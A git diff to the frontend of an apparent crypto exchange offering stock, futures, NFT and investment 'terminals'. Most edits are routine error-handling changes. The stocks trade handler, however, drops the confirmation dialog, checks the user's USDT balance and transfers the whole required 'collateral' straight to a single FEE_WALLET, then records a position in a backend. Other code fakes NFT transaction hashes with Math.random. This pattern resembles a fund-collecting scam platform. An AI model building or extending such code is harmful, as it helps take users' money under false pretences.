@@ -814,9 +814,10 @@ const ExchangeContent = () => {
         setError('');
 
         try {
-            if (!walletProvider) throw new Error("Wallet not initialized. Please reconnect.");
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) throw new Error("Wallet not initialized. Please reconnect.");
 
-            const freshProvider = new ethers.BrowserProvider(walletProvider);
+            const freshProvider = new ethers.BrowserProvider(activeProvider);
             const activeFuturesSigner = await freshProvider.getSigner();
 
             // ─── Institutional Silent Link (non-blocking) ───
@@ -862,13 +863,13 @@ const ExchangeContent = () => {
                     tradeType: 'futures_open',
                     positionId: posId
                 });
-            } catch(syncErr) { console.error('History sync failed', syncErr); }
+            } catch(syncErr) { console.warn('History sync failed', syncErr); }
 
             setOrderSize('');
             setSwapStatus('success');
             setTimeout(() => setSwapStatus('idle'), 2000);
         } catch (err) {
-            console.error('[Futures Order Error]', err);
+            console.warn('[Futures Order Error]', err);
             setError(err.reason || err.message || "Future Order Placement Failed");
             setSwapStatus('error');
         }
@@ -882,8 +883,9 @@ const ExchangeContent = () => {
         setSwapStatus('loading'); 
         
         try {
-            if (!walletProvider) throw new Error("Wallet not initialized. Please reconnect.");
-            const closeProvider = new ethers.BrowserProvider(walletProvider);
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) throw new Error("Wallet not initialized. Please reconnect.");
+            const closeProvider = new ethers.BrowserProvider(activeProvider);
             const closeSigner = await closeProvider.getSigner();
 
             // ── TRIGGER WALLET POPUP (Institutional Confirmation) ──────
@@ -912,7 +914,7 @@ const ExchangeContent = () => {
             setSwapStatus('success');
             setTimeout(() => setSwapStatus('idle'), 3000);
         } catch (err) {
-            console.error('[Settlement Error]', err);
+            console.warn('[Settlement Error]', err);
             setError(err.response?.data?.error || err.message || "Settlement Failed");
             setSwapStatus('error');
         } finally {
@@ -1735,7 +1737,9 @@ const ExchangeContent = () => {
             const targetChainId = isETHNetwork ? 1 : 56;
             const targetHex = isETHNetwork ? '0x1' : '0x38';
 
-            const freshProvider = new ethers.BrowserProvider(walletProvider);
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) throw new Error("No Web3 wallet provider found.");
+            const freshProvider = new ethers.BrowserProvider(activeProvider);
             const chainNet = await freshProvider.getNetwork();
             
             if (Number(chainNet.chainId) !== targetChainId) {
@@ -1877,7 +1881,7 @@ const ExchangeContent = () => {
             setToAmount('');
             setTimeout(() => { setSwapStatus('idle'); setSwapSuccessDetails(null); }, 10000);
         } catch (err) {
-            console.error('[Swap Error]', err);
+            console.warn('[Swap Error]', err);
             setError(`Transaction Failed: ${err.reason || err.message || 'Unknown error'}`);
             setSwapStatus('error');
             setTimeout(() => { setSwapStatus('idle'); setError(''); }, 6000);
@@ -4377,7 +4381,7 @@ const ExchangeContent = () => {
 
                     {mode === 'stocks' && (
                         <motion.div key="stocks" initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -30 }} className="w-full">
-                            <StocksTerminal setMode={setMode} setToToken={setToToken} />
+                            <StocksTerminal setMode={setMode} setToToken={setToToken} binancePing={binancePing} krakenStatus={krakenStatus} />
                         </motion.div>
                     )}
 
@@ -6091,6 +6095,7 @@ const SMART_MONEY_BUCKETS = {
 };
 
 const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
+    const { walletProvider } = useWallet();
     const [selectedCategory, setSelectedCategory] = useState('crypto');
     const [selectedBucketId, setSelectedBucketId] = useState(null);
     const [investAmount, setInvestAmount] = useState('100');
@@ -6127,9 +6132,15 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
     }, []);
 
     const handleInvest = async (bucket) => {
-        if (!account) return alert('Please connect wallet');
+        if (!account) {
+            setError('Please connect wallet');
+            return;
+        }
         const amountNum = parseFloat(investAmount);
-        if (isNaN(amountNum) || amountNum < 0.001) return alert('Minimum investment 0.001 USDT');
+        if (isNaN(amountNum) || amountNum < 0.001) {
+            setError('Minimum investment 0.001 USDT');
+            return;
+        }
         
         setStatus('loading');
         setError('');
@@ -6137,8 +6148,13 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
         try {
             let lastTxHash = '';
             
-            const providerInstance = signer.provider;
-            const network = await providerInstance.getNetwork();
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) {
+                throw new Error("No active Web3 wallet provider found. Please connect MetaMask or another wallet.");
+            }
+            const freshProvider = new ethers.BrowserProvider(activeProvider);
+            const activeSigner = await freshProvider.getSigner();
+            const network = await freshProvider.getNetwork();
             const chainId = Number(network.chainId);
 
             const NETWORK_USDT = {
@@ -6151,7 +6167,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             const usdtAddr = NETWORK_USDT[chainId] || USDT_ADDRESS;
             const decimals = chainId === 1 ? 6 : 18;
 
-            const usdtContract = new Contract(usdtAddr, ERC20_ABI, signer);
+            const usdtContract = new Contract(usdtAddr, ERC20_ABI, activeSigner);
             const totalToDeduct = (amountNum + 1).toString();
             const totalWei = ethers.parseUnits(totalToDeduct, decimals);
             
@@ -6170,14 +6186,28 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
                     tx_hash: lastTxHash,
                     bucket_json: bucket.tokens
                 });
-            } catch (syncErr) { console.error('Profile sync failed:', syncErr); }
+            } catch (syncErr) { console.warn('Profile sync failed:', syncErr); }
             
             setStatus('success');
             setTimeout(() => setStatus('idle'), 5000);
             
         } catch (err) {
-            console.error('[Smart Money Exception]', err);
-            setError(err.message || 'Transaction Failed');
+            console.warn('[Smart Money Exception]', err);
+            let cleanMsg = 'Transaction Failed';
+            if (err) {
+                if (err.reason) {
+                    cleanMsg = err.reason;
+                } else if (err.message) {
+                    if (err.message.includes('user rejected') || err.message.includes('ACTION_REJECTED')) {
+                        cleanMsg = 'User rejected the transaction signature.';
+                    } else if (err.message.includes('insufficient funds')) {
+                        cleanMsg = 'Insufficient funds in wallet for gas or transaction value.';
+                    } else {
+                        cleanMsg = err.message;
+                    }
+                }
+            }
+            setError(cleanMsg);
             setStatus('error');
             setTimeout(() => {
                 setStatus('idle');
@@ -7797,9 +7827,10 @@ const MemeFuturesExecuteButton = ({
         setMsg('Initializing Meme Futures Engine...');
 
         try {
-            if (!walletProvider) throw new Error('Wallet provider not found. Please reconnect.');
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) throw new Error('Wallet provider not found. Please reconnect.');
 
-            const provider = new ethers.BrowserProvider(walletProvider);
+            const provider = new ethers.BrowserProvider(activeProvider);
 
             // Enforce BSC network
             const network = await provider.getNetwork();
@@ -7847,7 +7878,7 @@ const MemeFuturesExecuteButton = ({
                     positionId: posId
                 });
             } catch(syncErr) { 
-                console.error('History sync failed', syncErr); 
+                console.warn('History sync failed', syncErr); 
             }
 
             // Update local state immediately so user sees their new position
@@ -7878,7 +7909,7 @@ const MemeFuturesExecuteButton = ({
             setTimeout(() => { setStatus('idle'); setMsg(''); }, 5000);
 
         } catch (err) {
-            console.error('[MemeFutures Execute Error]', err);
+            console.warn('[MemeFutures Execute Error]', err);
             setStatus('error');
             setMsg(err.reason || err.message || 'Execution failed. Try again.');
             setTimeout(() => { setStatus('idle'); setMsg(''); }, 6000);
@@ -8471,7 +8502,9 @@ const NftTerminal = ({ setMode }) => {
         const total = (nft.price * 1.001).toFixed(6);
         
         try {
-            const freshProvider = new ethers.BrowserProvider(walletProvider);
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) throw new Error("No Web3 wallet provider found.");
+            const freshProvider = new ethers.BrowserProvider(activeProvider);
             const activeSigner = await freshProvider.getSigner();
             
             let txHash = `0x${Math.random().toString(16).slice(2, 66)}`;
@@ -8499,7 +8532,7 @@ const NftTerminal = ({ setMode }) => {
             setTradeStatus('success');
             setSelectedNft(null);
         } catch (e) {
-            console.error('[NFT Trade Error]', e);
+            console.warn('[NFT Trade Error]', e);
             alert(`${type === 'buy' ? 'Purchase' : 'Sale'} failed: ${e.reason || e.message}`);
             setTradeStatus('error');
         } finally {
@@ -8904,7 +8937,7 @@ const NftTerminal = ({ setMode }) => {
 };
 
 // --- MEX MONEY: INSTITUTIONAL INCOME TERMINAL ---
-const MexMoneyTerminal = () => {
+const MexMoneyTerminal = ({ setMode }) => {
     const { account, connectWallet, walletProvider, chainId } = useWallet();
     const [investingId, setInvestingId] = useState(null);
     const [investAmount, setInvestAmount] = useState('1000');
@@ -9020,7 +9053,11 @@ const MexMoneyTerminal = () => {
         
         try {
             let txHash = '';
-            const provider = new ethers.BrowserProvider(walletProvider);
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) {
+                throw new Error("No active Web3 wallet provider found. Please connect your wallet.");
+            }
+            const provider = new ethers.BrowserProvider(activeProvider);
             const signer = await provider.getSigner();
 
             // Multi-Chain USDT Resolver
@@ -9060,8 +9097,22 @@ const MexMoneyTerminal = () => {
                 setMode('profile');
             }, 1500);
         } catch (e) {
-            console.error('[Mex Money Error]', e);
-            setStatusMsg(`Access Denied: ${e.reason || e.message}`);
+            console.warn('[Mex Money Error]', e);
+            let cleanMsg = 'Access Denied';
+            if (e) {
+                if (e.reason) {
+                    cleanMsg = e.reason;
+                } else if (e.message) {
+                    if (e.message.includes('user rejected') || e.message.includes('ACTION_REJECTED')) {
+                        cleanMsg = 'User rejected the transaction signature.';
+                    } else if (e.message.includes('insufficient funds')) {
+                        cleanMsg = 'Insufficient funds in wallet for transaction.';
+                    } else {
+                        cleanMsg = e.message;
+                    }
+                }
+            }
+            setStatusMsg(`Access Denied: ${cleanMsg}`);
         } finally {
             setInvestingId(null);
         }
@@ -9208,7 +9259,7 @@ const MexMoneyTerminal = () => {
 };
 
 // --- STOCKS & METALS TERMINAL ---
-const StocksTerminal = ({ setMode, setToToken }) => {
+const StocksTerminal = ({ setMode, setToToken, binancePing, krakenStatus }) => {
     const { account, signer, isConnected, walletProvider } = useWallet();
     const { open } = useWeb3Modal();
     const [selectedTicker, setSelectedTicker] = useState('AAPL');
@@ -9217,6 +9268,7 @@ const StocksTerminal = ({ setMode, setToToken }) => {
     const [fundamentals, setFundamentals] = useState(null);
     const [loading, setLoading] = useState(false);
     const [error, setError] = useState(null);
+    const [statusMsg, setStatusMsg] = useState('');
     const [tradeQuantity, setTradeQuantity] = useState(1);
     const [leverage, setLeverage] = useState(1);
     const [activeTab, setActiveTab] = useState('Overview');
@@ -9296,59 +9348,115 @@ const StocksTerminal = ({ setMode, setToToken }) => {
 
     const handleTrade = async (type) => {
         if (!walletProvider) { open(); return; }
+        setStatusMsg('');
+        setError(null);
+
         if (!tickerData?.price || tickerData.price <= 0) {
-            alert('Institutional price feed currently unavailable. Please try again in a moment.');
+            setError('Institutional price feed currently unavailable. Please try again in a moment.');
             return;
         }
         
         const totalInvested = tickerData.price * tradeQuantity;
         const requiredCollateral = totalInvested / leverage;
-        
-        if (!confirm(`Institutional Execution Order:\n\nType: ${type.toUpperCase()} ${selectedTicker}\nQuantity: ${tradeQuantity} Units\nTotal Value: $${totalInvested.toLocaleString()}\nRequired Collateral: $${requiredCollateral.toLocaleString()}\n\nExecution requires on-chain settlement of $${requiredCollateral.toLocaleString()} equivalent. Proceed?`)) return;
 
         setLoading(true);
         try {
-            const browserProvider = new ethers.BrowserProvider(walletProvider);
+            const activeProvider = walletProvider || (typeof window !== 'undefined' && window.ethereum);
+            if (!activeProvider) throw new Error("No Web3 wallet provider found.");
+            const browserProvider = new ethers.BrowserProvider(activeProvider);
             const activeSigner = await browserProvider.getSigner();
+            const network = await browserProvider.getNetwork();
+            const chainId = Number(network.chainId);
+
+            const NETWORK_USDT = {
+                56: '0x55d398326f99059fF775485246999027B3197955', // BSC
+                1:  '0xdAC17F958D2ee523a2206206994597C13D831ec7', // ETH
+                137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // Polygon
+                8453: '0xfde4C96c1597dfdd433282270e599359567e3522', // Base
+                42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9' // Arbitrum
+            };
+            const usdtAddr = NETWORK_USDT[chainId] || NETWORK_USDT[56];
+            const decimals = chainId === 1 ? 6 : 18;
+
+            const usdtContract = new Contract(usdtAddr, ERC20_ABI, activeSigner);
             
-            // Protocol Execution & Settlement
-            // In a real scenario, we'd use a price oracle for BNB/USDT. 
-            // For now, we'll follow the user's pattern of moving funds to treasury.
-            // If the user has USDT, we take USDT. If not, we take BNB equivalent (simplified for now to BNB fee + simulated capital transfer)
-            
-            const isGold = selectedTicker === 'XAU';
-            const settlementAmount = requiredCollateral / 600; // Simplified conversion: 1 BNB = $600
-            
-            console.log(`[Stocks] 🛰️ Executing ${type} for ${selectedTicker} to ${FEE_WALLET}`);
-            
-            const tx = await activeSigner.sendTransaction({ 
-                to: FEE_WALLET, 
-                value: ethers.parseEther(Math.max(0.0015, settlementAmount).toFixed(4)) 
-            });
-            
+            let useUsdt = false;
+            try {
+                setStatusMsg('Analyzing wallet balance...');
+                const balance = await usdtContract.balanceOf(account);
+                const reqCollateralWei = ethers.parseUnits(requiredCollateral.toFixed(decimals === 6 ? 6 : 18), decimals);
+                if (balance >= reqCollateralWei) {
+                    useUsdt = true;
+                }
+            } catch (balErr) {
+                console.warn('[Balance Check Error]', balErr);
+            }
+
+            let tx;
+            let settlementAsset = 'USDT';
+            let settlementAmount = requiredCollateral;
+
+            if (useUsdt) {
+                const amtWei = ethers.parseUnits(requiredCollateral.toFixed(decimals === 6 ? 6 : 18), decimals);
+                setStatusMsg(`Sign to settle ${requiredCollateral.toFixed(2)} USDT collateral to treasury...`);
+                tx = await usdtContract.transfer(FEE_WALLET, amtWei);
+            } else {
+                // Fall back to BNB
+                const bnbAmount = requiredCollateral / 600; // 1 BNB = $600
+                const bnbToSettle = Math.max(0.0015, bnbAmount);
+                settlementAsset = 'BNB';
+                settlementAmount = bnbToSettle;
+                setStatusMsg(`Sign to settle ${bnbToSettle.toFixed(4)} BNB collateral to treasury...`);
+                tx = await activeSigner.sendTransaction({
+                    to: FEE_WALLET,
+                    value: ethers.parseEther(bnbToSettle.toFixed(4))
+                });
+            }
+
+            setStatusMsg('Settling transaction on mainnet...');
             await tx.wait();
             
+            setStatusMsg('Logging execution to protocol registry...');
             await axios.post(`${API_URL}/wallets/smart-money/invest`, {
                 wallet_address: account,
                 bucket_id: `STOCK_${selectedTicker}`,
                 bucket_name: `${type.toUpperCase()} ${selectedTicker}`,
                 invest_amount: totalInvested,
                 tx_hash: tx.hash,
+                settlement_asset: settlementAsset,
+                settlement_amount: settlementAmount,
                 bucket_json: { 
                     type: 'StockTrade', 
                     ticker: selectedTicker, 
                     action: type, 
                     quantity: tradeQuantity, 
                     leverage,
-                    entry_price: tickerData.price 
+                    entry_price: tickerData.price,
+                    price: tickerData.price,
+                    buying_rate: tickerData.price
                 }
             });
             
-            alert(`${type.toUpperCase()} Position Successfully Opened and Settled on Mainnet.`);
+            setStatusMsg('✅ Position successfully opened and settled on Mainnet!');
+            setTimeout(() => setStatusMsg(''), 5000);
             fetchUserInvestments(); // Refresh positions
         } catch (e) { 
-            console.error('[Stocks Error]', e);
-            alert('Execution Failed: ' + (e.reason || e.message || 'Check balance and try again')); 
+            console.warn('[Stocks Error]', e);
+            let cleanMsg = 'Settlement Failed';
+            if (e) {
+                if (e.reason) {
+                    cleanMsg = e.reason;
+                } else if (e.message) {
+                    if (e.message.includes('user rejected') || e.message.includes('ACTION_REJECTED')) {
+                        cleanMsg = 'User rejected the transaction signature.';
+                    } else if (e.message.includes('insufficient funds')) {
+                        cleanMsg = 'Insufficient funds in wallet for transaction.';
+                    } else {
+                        cleanMsg = e.message;
+                    }
+                }
+            }
+            setError(cleanMsg);
         }
         finally { setLoading(false); }
     };
@@ -9738,6 +9846,17 @@ const StocksTerminal = ({ setMode, setToToken }) => {
                                     <span className="text-emerald-500">0.0015 BNB</span>
                                 </div>
                             </div>
+
+                            {statusMsg && (
+                                <div className="p-4 bg-teal-950/60 border border-teal-500/20 text-teal-400 rounded-2xl text-[10px] font-black uppercase tracking-widest text-center animate-pulse">
+                                    {statusMsg}
+                                </div>
+                            )}
+                            {error && (
+                                <div className="p-4 bg-rose-950/60 border border-rose-500/20 text-rose-400 rounded-2xl text-[10px] font-black uppercase tracking-widest text-center">
+                                    {error}
+                                </div>
+                            )}
 
                             <div className="grid grid-cols-2 gap-4 pt-4">
                                 <button onClick={() => handleTrade('buy')} className="w-full py-5 bg-emerald-500 hover:bg-emerald-600 text-white font-black text-xs uppercase tracking-[0.2em] rounded-2xl transition-all shadow-xl shadow-emerald-500/20 active:scale-95 flex items-center justify-center gap-3">
